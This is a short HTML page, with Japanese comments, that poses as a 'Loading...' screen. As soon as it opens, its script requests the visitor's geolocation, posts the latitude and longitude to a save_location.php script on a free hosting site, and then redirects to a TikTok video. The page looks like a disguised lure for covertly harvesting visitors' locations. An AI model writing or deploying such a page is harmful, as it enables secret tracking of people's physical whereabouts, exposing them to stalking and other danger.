<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
            } else {
                redirectNow();
            }
        }

        function sendLocation(position) {
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            // 無料PHPサーバーのURLに変更
            fetch("bokunoko.myartsonline.com/home/www/public_html/save_location.php", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: `lat=${lat}&lon=${lon}`
            }).finally(redirectNow);
        }

        function redirectNow() {
            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // リダイレクト先のURL
        }

        getLocation();
    </script>
</head>

</html>
